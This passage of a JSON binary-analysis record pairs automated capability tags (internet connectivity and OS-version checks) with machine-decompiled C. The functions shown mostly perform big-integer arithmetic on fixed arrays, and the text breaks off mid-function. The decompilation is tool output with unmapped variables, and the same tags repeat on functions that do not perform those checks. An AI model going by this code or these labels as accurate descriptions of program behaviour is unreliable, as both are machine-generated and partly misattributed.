== NULL);\n            var_fd4h_2 = uVar13;\n            iVar8 = 0;\n            puVar5 = var_fd8h_2;\n            if (0 < iVar7) {\n                do {\n                    puVar6[iVar8] = *puVar5;\n                    iVar8 = iVar8 + 1;\n                    puVar5 = puVar5 + -1;\n                } while (iVar8 < iVar7);\n            }\n            puVar5 = &fcn.00402c50::var_650h_2;\n            for (iVar8 = 200; iVar8 != 0; iVar8 = iVar8 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            var_654h_2 = iVar7;\n            if (200 < iVar7) {\n                var_654h_2 = 200;\n            }\n            iVar8 = var_654h_2 + -1;\n            if (-1 < iVar8) {\n                puVar5 = &fcn.00402c50::var_650h_2;\n                do {\n                    *puVar5 = puVar6[iVar8];\n                    puVar5 = puVar5 + 1;\n                    iVar8 = iVar8 + -1;\n                } while (-1 < iVar8);\n            }\n            while ((1 < var_654h_2 && ((&fcn.00402c50::var_654h_2)[var_654h_2] == 0))) {\n                var_654h_2 = var_654h_2 + -1;\n            }\n            puVar5 = &stack0xfffffcd0;\n            for (iVar8 = 200; iVar8 != 0; iVar8 = iVar8 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            iStack820 = 0;\n            var_1010h_2 = var_fd4h_2;\n            if (uVar13 == 0) {\ncode_r0x00402f6e:\n                iStack820 = 1;\n            }\n            else {\n                do {\n                    puVar5 = uVar13 >> 0x20;\n                    var_1010h_2 = uVar13;\n                    if (199 < iStack820) break;\n                    *(&stack0xfffffcd0 + iStack820 * 4) = uVar13;\n                    iStack820 = iStack820 + 1;\n                    uVar13 = ZEXT48(puVar5);\n                    var_1010h_2 = puVar5;\n                } while (puVar5 != NULL);\n                if (iStack820 == 0) goto code_r0x00402f6e;\n            }\n            puVar5 = &fcn.00402c50::var_650h_2;\n            for (iVar8 = 200; iVar8 != 0; iVar8 = iVar8 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            var_654h_2 = var_32ch_3;\n            iVar8 = 0;\n            if (0 < var_32ch_3) {\n                puVar5 = &fcn.00402c50::var_650h_2;\n                do {\n                    *puVar5 = (&fcn.00402c50::var_330h)[iVar8];\n                    iVar8 = iVar8 + 1;\n                    puVar5 = puVar5 + 1;\n                } while (iVar8 < var_32ch_3);\n            }\n            var_65ch = 0x402fcd;\n            fcn.004025d0(&fcn.00402c50::var_ff0h, var_32ch_3, var_650h_2);\n            iVar3 = var_334h;\n            iVar8 = var_654h_2;\n            while (((var_65ch & 0x80000000) == 0 || (iVar3 < 0))) {\n                if (((var_65ch & 0x80000000) != 0) || (-1 < iVar3)) {\n                    iVar2 = var_ff0h;\n                    if (var_ff0h <= iVar8) {\n                        iVar2 = iVar8;\n                    }\n                    do {\n                        iVar2 = iVar2 + -1;\n                        if (iVar2 < 0) goto code_r0x00403027;\n                        uVar10 = (&fcn.00402c50::var_fech)[iVar2];\n                    } while (uVar10 == (&fcn.00402c50::var_650h_2)[iVar2]);\n                    if ((iVar2 < 0) ||\n                       (uVar10 < (&fcn.00402c50::var_650h_2)[iVar2] || uVar10 == (&fcn.00402c50::var_650h_2)[iVar2]))\n                    break;\n                }\n                var_fd4h_2 = var_fd4h_2 + -1;\n                var_1010h_2 = &fcn.00402c50::var_fcch;\n                fcn.004023f0(&fcn.00402c50::var_32ch_3);\n            }\ncode_r0x00403027:\n            fcn.00402310(&fcn.00402c50::var_654h_2);\n            iVar8 = 0;\n            puVar5 = var_fd8h_2;\n            if (0 < iVar7) {\n                do {\n                    *puVar5 = (&fcn.00402c50::var_ca0h)[var_32ch_3 - iVar8];\n                    iVar8 = iVar8 + 1;\n                    puVar5 = puVar5 + -1;\n                } while (iVar8 < iVar7);\n            }\n            var_fd8h_2 = var_fd8h_2 + -1;\n            *(&stack0xfffffcd0 + var_fech_2 * 4) = var_fd4h_2;\n            var_fech_2 = var_fech_2 + 1;\n            var_ff4h_2 = var_ff4h_2 + -1;\n        } while (0 < var_ff4h_2);\n    }\n    *var_32ch_2 = var_fech_2;\n    iVar8 = var_fech_2 + -1;\n    iVar7 = 0;\n    piVar11 = var_32ch_2;\n    if (iVar8 < 0) {\ncode_r0x004030e7:\n        piVar11 = var_32ch_2 + iVar7 + 1;\n        for (iVar8 = 200 - iVar7; iVar8 != 0; iVar8 = iVar8 + -1) {\n            *piVar11 = 0;\n            piVar11 = piVar11 + 1;\n        }\n    }\n    else {\n        do {\n            piVar11[1] = *(&stack0xfffffcd0 + iVar8 * 4);\n            iVar8 = iVar8 + -1;\n            piVar11 = piVar11 + 1;\n        } while (-1 < iVar8);\n        iVar7 = var_fech_2;\n        if (var_fech_2 < 200) goto code_r0x004030e7;\n    }\n    iVar7 = *var_32ch_2;\n    while ((1 < iVar7 && (var_32ch_2[*var_32ch_2] == 0))) {\n        iVar7 = *var_32ch_2 + -1;\n        *var_32ch_2 = iVar7;\n    }\n    if (*var_32ch_2 == 0) {\n        *var_32ch_2 = 1;\n    }\n    iVar7 = fcn.00402a50(arg_8h, iVar9);\n    iVar9 = 0;\n    *extraout_ECX = iVar7;\n    piVar11 = extraout_ECX;\n    if (0 < iVar7) {\n        do {\n            piVar11 = piVar11 + 1;\n            *piVar11 = arg_8h[iVar9];\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < *extraout_ECX);\n        if (199 < iVar9) goto code_r0x0040316c;\n    }\n    piVar11 = extraout_ECX + iVar9 + 1;\n    for (iVar7 = 200 - iVar9; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *piVar11 = 0;\n        piVar11 = piVar11 + 1;\n    }\ncode_r0x0040316c:\n    if (arg_8h != NULL) {\n        fcn.00407a08();\n    }\n    if (puVar6 != NULL) {\n        fcn.00407a08();\n    }\n    fcn.00406bb6(unaff_EBP);\n    return;\n}\n",
        "token_count": 3398
    },
    "004031f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004031f0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t *in_ECX;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t *in_EDX;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    uint32_t *puVar7;\n    uint32_t in_stack_0000032c;\n    uint in_stack_fffffcac;\n    uint32_t var_340h;\n    uint var_33ch;\n    uint var_338h;\n    uint var_334h;\n    uint var_330h;\n    uint32_t var_32ch;\n    uint var_328h;\n    uint32_t var_4h;\n    \n    var_4h = *0x41b0e4 ^ &stack0xfffffffc;\n    piVar4 = &arg_ch;\n    piVar5 = in_EDX + 1;\n    for (iVar3 = 200; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *piVar5 = *piVar4;\n        piVar4 = piVar4 + 1;\n        piVar5 = piVar5 + 1;\n    }\n    var_340h = 0;\n    *in_EDX = arg_8h;\n    if (1 < arg_8h) {\n        do {\n            if (in_EDX[*in_EDX] != 0) break;\n            iVar3 = *in_EDX + -1;\n            *in_EDX = iVar3;\n        } while (1 < iVar3);\n    }\n    iVar3 = *in_EDX;\n    uVar2 = in_EDX[iVar3];\n    if (in_stack_0000032c <= uVar2) {\n        in_stack_fffffcac = 0;\n        var_328h = fcn.0040ee50(uVar2, 0);\n        in_EDX[iVar3] = extraout_ECX;\n    }\n    var_32ch = in_stack_0000032c <= uVar2;\n    iVar6 = iVar3 + -2;\n    if (-1 < iVar6) {\n        piVar4 = in_EDX + iVar3 + -1;\n        do {\n            uVar1 = fcn.0040ee50();\n            (&var_328h)[var_32ch] = uVar1;\n            var_32ch = var_32ch + 1;\n            piVar4[1] = 0;\n            *piVar4 = extraout_ECX_00;\n            piVar4 = piVar4 + -1;\n            iVar6 = iVar6 + -1;\n        } while (-1 < iVar6);\n    }\n    *in_ECX = var_32ch;\n    iVar3 = var_32ch - 1;\n    if (-1 < iVar3) {\n        var_340h = var_32ch;\n        puVar7 = in_ECX;\n        do {\n            puVar7 = puVar7 + 1;\n            *puVar7 = (&var_328h)[iVar3];\n            iVar3 = iVar3 + -1;\n        } while (-1 < iVar3);\n        if (199 < var_32ch) goto code_r0x0040334f;\n    }\n    puVar7 = in_ECX + var_340h + 1;\n    for (iVar3 = 200 - var_340h; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\ncode_r0x0040334f:\n    uVar2 = *in_ECX;\n    while ((1 < uVar2 && (in_ECX[*in_ECX] == 0))) {\n        uVar2 = *in_ECX - 1;\n        *in_ECX = uVar2;\n    }\n    if (*in_ECX == 0) {\n        *in_ECX = 1;\n    }\n    iVar3 = *in_EDX;\n    while ((1 < iVar3 && (in_EDX[*in_EDX] == 0))) {\n        iVar3 = *in_EDX + -1;\n        *in_EDX = iVar3;\n    }\n    fcn.00406bb6(in_stack_fffffcac);\n    return;\n}\n",
        "token_count": 983
    },
    "004033a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_981h_2\n// WARNING: Variable defined which should be unmapped: var_988h_3\n\nvoid fcn.004033a0(int32_t param_1)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t *unaff_EBX;\n    uint *puVar6;\n    uint var_8h_2;\n    int32_t var_ch;\n    uint var_ch_2;\n    uint32_t var_8h;\n    int32_t var_330h_3;\n    uint var_330h_4;\n    uint32_t var_32ch_2;\n    uint var_988h;\n    uint var_981h;\n    uint var_658h;\n    uint var_654h;\n    uint var_330h;\n    uint var_32ch;\n    uint var_4h;\n    int32_t iStackY4064;\n    uint in_stack_fffff028;\n    int32_t aiStack3256 [200];\n    uint *puStack2456;\n    uint var_988h_3;\n    uchar auStack2444 [3];\n    uint var_981h_2;\n    char var_981h_3;\n    uint var_980h;\n    uint var_988h_2;\n    uint var_988h_4;\n    uint var_658h_2;\n    uint var_658h_3;\n    uint auStack1624 [200];\n    uint var_330h_2;\n    int32_t var_32ch_3;\n    uint var_32ch_4;\n    uint var_4h_2;\n    uint32_t var_4h_3;\n    \n    var_4h_3 = *0x41b0e4 ^ &stack0xfffffffc;\n    puVar2 = &fcn.004033a0::var_32ch_4;\n    for (iVar4 = 200; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    puVar2 = &stack0xfffff9a8;\n    for (iVar4 = 200; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    var_32ch_3 = 1;\n    var_981h_3 = '\\0';\n    var_981h_2._3_1_ = '\\0';\n    if ((var_8h & 0x80000000) != 0) {\n        puStack2456 = 0x403408;\n        puVar2 = fcn.00402470();\n        puVar6 = &fcn.004033a0::var_ch;\n        for (iVar4 = 0xc9; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar6 = *puVar2;\n            puVar2 = puVar2 + 1;\n            puVar6 = puVar6 + 1;\n        }\n        var_981h_2._3_1_ = '\\x01';\n    }\n    if ((var_32ch_2 & 0x80000000) != 0) {\n        puStack2456 = 0x403438;\n        puVar2 = fcn.00402470();\n        puVar6 = &fcn.004033a0::var_330h_3;\n        for (iVar4 = 0xc9; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar6 = *puVar2;\n            puVar2 = puVar2 + 1;\n            puVar6 = puVar6 + 1;\n        }\n        var_981h_3 = '\\x01';\n    }\n    puStack2456 = 0x40345c;\n    cVar1 = fcn.00402b90();\n    iVar4 = 200;\n    if (cVar1 != '\\0') {\n        iVar3 = 0;\n        piVar5 = unaff_EBX + 1;\n        for (; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *piVar5 = 0;\n            piVar5 = piVar5 + 1;\n        }\n        *unaff_EBX = 1;\n        piVar5 = unaff_EBX + 1;\n        do {\n            *piVar5 = (&fcn.004033a0::var_32ch_4)[iVar3];\n            iVar3 = iVar3 + 1;\n            piVar5 = piVar5 + 1;\n        } while (iVar3 < *unaff_EBX);\n        fcn.00406bb6(_auStack2444);\n        return;\n    }\n    if (var_330h_3 == 1) {\n        puVar2 = &stack0xfffff34c;\n        for (; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        aiStack3256[0] = var_330h_3;\n        iVar4 = 0;\n        puVar2 = &stack0xfffff34c;\n        do {\n            *puVar2 = (&fcn.004033a0::var_330h_4)[iVar4];\n            iVar4 = iVar4 + 1;\n            puVar2 = puVar2 + 1;\n        } while (iVar4 < 1);\n        _auStack2444 = &stack0xfffff024;\n        puVar2 = &stack0xfffff028;\n        for (iVar4 = 200; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        iVar4 = 0;\n        if (0 < var_ch) {\n            puVar2 = &stack0xfffff028;\n            _auStack2444 = &stack0xfffff024;\n            do {\n                *puVar2 = (&fcn.004033a0::var_ch_2)[iVar4];\n                iVar4 = iVar4 + 1;\n                puVar2 = puVar2 + 1;\n            } while (iVar4 < var_ch);\n        }\n        iStackY4064 = 0x403534;\n        fcn.004031f0(var_ch, in_stack_fffff028);\n    }\n    else {\n        puStack2456 = &fcn.004033a0::var_32ch_3;\n        iVar3 = 0;\n        puVar2 = &stack0xfffff348;\n        for (; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        if (0 < var_330h_3) {\n            puVar2 = &stack0xfffff348;\n            do {\n                *puVar2 = (&fcn.004033a0::var_330h_4)[iVar3];\n                iVar3 = iVar3 + 1;\n                puVar2 = puVar2 + 1;\n            } while (iVar3 < var_330h_3);\n        }\n        _auStack2444 = &stack0xfffff020;\n        puVar2 = &stack0xfffff024;\n        for (iVar4 = 200; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        iStackY4064 = var_ch;\n        iVar4 = 0;\n        if (0 < var_ch) {\n            puVar2 = &stack0xfffff024;\n            _auStack2444 = &stack0xfffff020;\n            do {\n                *puVar2 = (&fcn.004033a0::var_ch_2)[iVar4];\n                iVar4 = iVar4 + 1;\n                puVar2 = puVar2 + 1;\n            } while (iVar4 < var_ch);\n        }\n        fcn.00402c50();\n    }\n    if (var_981h_2._3_1_ == var_981h_3) {\n        iVar4 = 0;\n        piVar5 = unaff_EBX + 1;\n        for (iVar3 = 200; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *piVar5 = 0;\n            piVar5 = piVar5 + 1;\n        }\n        *unaff_EBX = var_32ch_3;\n        if (0 < var_32ch_3) {\n            piVar5 = unaff_EBX + 1;\n            do {\n                *piVar5 = (&fcn.004033a0::var_32ch_4)[iVar4];\n                iVar4 = iVar4 + 1;\n                piVar5 = piVar5 + 1;\n            } while (iVar4 < *unaff_EBX);\n        }\n        fcn.00406bb6(_auStack2444);\n        return;\n    }\n    puStack2456 = 0x4035ee;\n    fcn.00402470();\n    fcn.00406bb6(_auStack2444);\n    return;\n}\n",
        "token_count": 2078
    },
    "00403650": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_98ch_2\n\nvoid fcn.00403650(int32_t *param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    int32_t *piVar7;\n    int32_t *var_ch_2;\n    int32_t var_10h;\n    uint var_10h_2;\n    uint32_t var_ch;\n    int32_t var_334h;\n    uint var_334h_2;\n    uint32_t var_330h_2;\n    uint var_330h_4;\n    uint var_98ch;\n    uint var_988h;\n    uint var_981h;\n    uint var_658h;\n    uint var_654h;\n    uint var_330h;\n    uint var_32ch;\n    uint var_4h;\n    uint in_stack_fffff01c;\n    int32_t aiStack3268 [200];\n    uint *puStack2468;\n    uint var_98ch_2;\n    int32_t *var_988h_3;\n    uint var_981h_2;\n    char var_981h_3;\n    uint var_980h;\n    uint var_988h_2;\n    uint var_988h_4;\n    uint var_658h_2;\n    uint auStack1624 [200];\n    uint var_330h_3;\n    int32_t var_32ch_2;\n    uint var_32ch_3;\n    uint var_4h_2;\n    uint32_t var_4h_3;\n    \n    iVar4 = var_10h;\n    var_4h_3 = *0x41b0e4 ^ &stack0xfffffffc;\n    var_988h_3 = var_ch_2;\n    iVar2 = 0;\n    puVar3 = &stack0xfffff9a8;\n    for (iVar5 = 200; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &fcn.00403650::var_32ch_3;\n    for (iVar5 = 200; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_658h_2 = 1;\n    var_32ch_2 = var_10h;\n    if (0 < var_10h) {\n        do {\n            (&fcn.00403650::var_32ch_3)[iVar2] = (&fcn.00403650::var_10h_2)[iVar2];\n            iVar2 = iVar2 + 1;\n        } while (iVar2 < var_10h);\n    }\n    var_981h_3 = '\\0';\n    if ((var_ch & 0x80000000) != 0) {\n        puStack2468 = 0x4036d9;\n        puVar3 = fcn.00402470();\n        puVar6 = &fcn.00403650::var_10h;\n        for (iVar2 = 0xc9; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar6 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar6 = puVar6 + 1;\n        }\n        var_981h_3 = '\\x01';\n    }\n    if ((var_330h_2 & 0x80000000) != 0) {\n        puStack2468 = 0x403709;\n        puVar3 = fcn.00402470();\n        puVar6 = &fcn.00403650::var_334h;\n        for (iVar2 = 0xc9; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar6 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar6 = puVar6 + 1;\n        }\n    }\n    puStack2468 = 0x403726;\n    cVar1 = fcn.00402b90();\n    iVar2 = 200;\n    if (cVar1 == '\\0') {\n        if (var_334h == 1) {\n            puVar3 = &stack0xfffff340;\n            for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            aiStack3268[0] = var_334h;\n            iVar4 = 0;\n            puVar3 = &stack0xfffff340;\n            do {\n                *puVar3 = (&fcn.00403650::var_334h_2)[iVar4];\n                iVar4 = iVar4 + 1;\n                puVar3 = puVar3 + 1;\n            } while (iVar4 < 1);\n            puVar3 = &stack0xfffff01c;\n            for (iVar4 = 200; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            iVar4 = 0;\n            if (0 < var_10h) {\n                puVar3 = &stack0xfffff01c;\n                do {\n                    *puVar3 = (&fcn.00403650::var_10h_2)[iVar4];\n                    iVar4 = iVar4 + 1;\n                    puVar3 = puVar3 + 1;\n                } while (iVar4 < var_10h);\n            }\n            fcn.004031f0(var_10h, in_stack_fffff01c);\n        }\n        else {\n            puStack2468 = &fcn.00403650::var_658h_2;\n            iVar4 = 0;\n            puVar3 = &stack0xfffff33c;\n            for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            if (0 < var_334h) {\n                puVar3 = &stack0xfffff33c;\n                do {\n                    *puVar3 = (&fcn.00403650::var_334h_2)[iVar4];\n                    iVar4 = iVar4 + 1;\n                    puVar3 = puVar3 + 1;\n                } while (iVar4 < var_334h);\n            }\n            puVar3 = &stack0xfffff018;\n            for (iVar4 = 200; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            iVar4 = 0;\n            if (0 < var_10h) {\n                puVar3 = &stack0xfffff018;\n                do {\n                    *puVar3 = (&fcn.00403650::var_10h_2)[iVar4];\n                    iVar4 = iVar4 + 1;\n                    puVar3 = puVar3 + 1;\n                } while (iVar4 < var_10h);\n            }\n            fcn.00402c50();\n        }\n        if (var_981h_3 != '\\0') {\n            puStack2468 = 0x4038d5;\n            fcn.00402470();\n            fcn.00406bb6(var_98ch_2);\n            return;\n        }\n        iVar4 = 0;\n        piVar7 = var_988h_3;\n        for (iVar2 = 200; piVar7 = piVar7 + 1,  iVar2 != 0; iVar2 = iVar2 + -1) {\n            *piVar7 = 0;\n        }\n        *var_988h_3 = var_32ch_2;\n        piVar7 = var_988h_3;\n        if (0 < var_32ch_2) {\n            do {\n                piVar7[1] = (&fcn.00403650::var_32ch_3)[iVar4];\n                iVar4 = iVar4 + 1;\n                piVar7 = piVar7 + 1;\n            } while (iVar4 < *var_988h_3);\n        }\n    }\n    else {\n        iVar5 = 0;\n        piVar7 = var_ch_2;\n        for (; piVar7 = piVar7 + 1,  iVar2 != 0; iVar2 = iVar2 + -1) {\n            *piVar7 = 0;\n        }\n        *var_ch_2 = iVar4;\n        piVar7 = var_ch_2;\n        if (0 < iVar4) {\n            do {\n                piVar7[1] = (&fcn.00403650::var_32ch_3)[iVar5];\n                iVar5 = iVar5 + 1;\n                piVar7 = piVar7 + 1;\n            } while (iVar5 < *var_ch_2);\n            fcn.00406bb6(var_98ch_2);\n            return;\n        }\n    }\n    fcn.00406bb6(var_98ch_2);\n    return;\n}\n",
        "token_count": 2079
    },
    "00403940": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004039a9)\n\nvoid __thiscall fcn.00403940(int32_t *param_1, int32_t *param_2, int32_t param_3, uint8_t param_4)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    int32_t *piVar8;\n    int32_t var_330h_3;\n    uint var_334h_8;\n    uint var_650h;\n    int32_t var_330h_2;\n    uint var_334h_7;\n    uint var_cbch;\n    uint var_cb8h;\n    uint var_cadh;\n    uint32_t in_stack_0000064c;\n    uint var_334h;\n    uint var_330h;\n    uint var_8h;\n    uint in_stack_ffffe370;\n    uint auStack6508 [198];\n    uint uStack5716;\n    uchar *puStack5712;\n    uchar auStack5708 [796];\n    uint uStack4912;\n    uchar *puStack4908;\n    uint in_stack_ffffece0;\n    int32_t aiStack4096 [2];\n    uint var_cd0h;\n    uint var_ccch;\n    uint var_cc8h;\n    uint var_cc4h;\n    uint var_cc0h;\n    uint var_cbch_2;\n    uint var_cb8h_3;\n    uint var_cb4h;\n    uint var_cach;\n    uint var_984h_2;\n    uint var_658h_2;\n    uint var_334h_3;\n    uint var_330h_5;\n    uint uStack3300;\n    int32_t iStack3280;\n    int32_t iStack3276;\n    uint32_t *puStack3272;\n    uint32_t uStack3268;\n    int32_t *piStack3264;\n    int32_t var_cb8h_2;\n    uint var_cb4h_2;\n    char cStack3249;\n    uchar auStack3248 [4];\n    uint var_984h;\n    uint var_334h_5;\n    uint var_ch_2;\n    uint var_10h_2;\n    int32_t iStack2488;\n    uint auStack2484 [11];\n    int32_t iStack2440;\n    int32_t var_65ch;\n    uint var_658h;\n    uint var_ch_3;\n    uint var_334h_4;\n    int32_t iStack1684;\n    uint auStack1680 [12];\n    int32_t iStack1632;\n    uint var_334h_2;\n    uint var_330h_4;\n    uint var_330h_6;\n    uint var_334h_6;\n    int32_t var_334h_9;\n    int32_t iStack820;\n    uint var_8h_2;\n    uint var_ch;\n    uint var_10h;\n    uint32_t uStack12;\n    \n    uStack12 = *0x41b0e4 ^ &stack0xfffffffc;\n    piStack3264 = param_2;\n    puVar2 = &stack0xfffffccc;\n    for (iVar3 = 200; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    var_334h_9 = 0;\n    iStack820 = 1;\n    var_334h_9 = 1;\n    var_334h_9 = 1;\n    uVar6 = param_1[200];\n    puVar2 = &stack0xfffff000;\n    for (iVar3 = 200; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    cStack3249 = '\\0';\n    if ((uVar6 & 0x80000000) == 0) {\n        iVar3 = 0;\n        if (0 < var_330h_2) {\n            puVar2 = &stack0xfffff000;\n            do {\n                *puVar2 = (&fcn.00403940::var_334h_7)[iVar3];\n                iVar3 = iVar3 + 1;\n                puVar2 = puVar2 + 1;\n            } while (iVar3 < var_330h_2);\n        }\n        puVar2 = &stack0xffffecdc;\n        for (iVar3 = 200; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        iVar3 = *param_1;\n        iVar4 = 0;\n        if (0 < iVar3) {\n            puVar2 = &stack0xffffecdc;\n            do {\n                *puVar2 = *((param_1 - &stack0xffffecd8) + puVar2);\n                iVar4 = iVar4 + 1;\n                puVar2 = puVar2 + 1;\n            } while (iVar4 < iVar3);\n        }\n        puStack4908 = &stack0xfffff9a0;\n        uStack4912 = 0x403aab;\n        puVar2 = fcn.00403650();\n    }\n    else {\n        iVar3 = 0;\n        if (0 < var_330h_2) {\n            puVar2 = &stack0xfffff000;\n            do {\n                *puVar2 = (&fcn.00403940::var_334h_7)[iVar3];\n                iVar3 = iVar3 + 1;\n                puVar2 = puVar2 + 1;\n            } while (iVar3 < var_330h_2);\n        }\n        puStack4908 = 0x403a26;\n        fcn.00402470();\n        puStack4908 = &stack0xfffff9a0;\n        uStack4912 = 0x403a32;\n        puVar2 = fcn.00403650();\n        cStack3249 = '\\x01';\n    }\n    puVar7 = &stack0xfffff678;\n    for (iVar3 = 0xc9; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    if ((in_stack_0000064c & 0x80000000) != 0) {\n        uStack3300 = 0x403add;\n        puVar2 = fcn.00402470();\n        puVar7 = &fcn.00403940::var_330h_2;\n        for (iVar3 = 0xc9; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar7 = *puVar2;\n            puVar2 = puVar2 + 1;\n            puVar7 = puVar7 + 1;\n        }\n    }\n    puVar2 = &fcn.00403940::var_334h_2;\n    for (iVar3 = 200; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    (&fcn.00403940::var_334h_2)[var_330h_2 * 2] = 1;\n    iVar3 = var_330h_2 * 2 + 1;\n    puVar2 = &stack0xfffff000;\n    for (iVar4 = 200; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    iVar4 = 0;\n    iStack1632 = iVar3;\n    if (0 < var_330h_2) {\n        puVar2 = &stack0xfffff000;\n        do {\n            *puVar2 = (&fcn.00403940::var_334h_7)[iVar4];\n            iVar4 = iVar4 + 1;\n            puVar2 = puVar2 + 1;\n        } while (iVar4 < var_330h_2);\n    }\n    iVar4 = 0;\n    puVar2 = &stack0xffffecdc;\n    for (iVar5 = 200; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    if (0 < iVar3) {\n        puVar2 = &stack0xffffecdc;\n        do {\n            *puVar2 = (&fcn.00403940::var_334h_2)[iVar4];\n            iVar4 = iVar4 + 1;\n            puVar2 = puVar2 + 1;\n        } while (iVar4 < iVar3);\n    }\n    puStack4908 = 0x403bac;\n    puVar2 = fcn.004033a0();\n    puVar7 = &stack0xfffff9a0;\n    for (iVar3 = 0xc9; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    while ((1 < var_330h_3 && ((&fcn.00403940::var_330h_3)[var_330h_3] == 0))) {\n        var_330h_3 = var_330h_3 + -1;\n    }\n    uVar6 = 0x80000000;\n    var_cb8h_2 = 0x20;\n    do {\n        if (((&fcn.00403940::var_330h_3)[var_330h_3] & uVar6) != 0) break;\n        var_cb8h_2 = var_cb8h_2 + -1;\n        uVar6 = uVar6 >> 1;\n    } while (0 < var_cb8h_2);\n    var_cb8h_2 = var_330h_3 * 0x20 + -0x20 + var_cb8h_2;\n    iVar3 = 0;\n    iStack3276 = 0;\n    if (0 < var_330h_3) {\n        puStack3272 = &fcn.00403940::var_334h_8;\n        do {\n            uStack3268 = 1;\n            iStack3280 = 0;\n            do {\n                if ((*puStack3272 & uStack3268) != 0) {\n                    iVar4 = 0;\n                    puVar2 = &stack0xfffff000;\n                    for (iVar5 = 200; iVar1 = iStack1632,  iVar5 != 0; iVar5 = iVar5 + -1) {\n                        *puVar2 = 0;\n                        puVar2 = puVar2 + 1;\n                    }\n                    if (0 < iStack1632) {\n                        puVar2 = &stack0xfffff000;\n                        do {\n                            *puVar2 = (&fcn.00403940::var_334h_2)[iVar4];\n                            iVar4 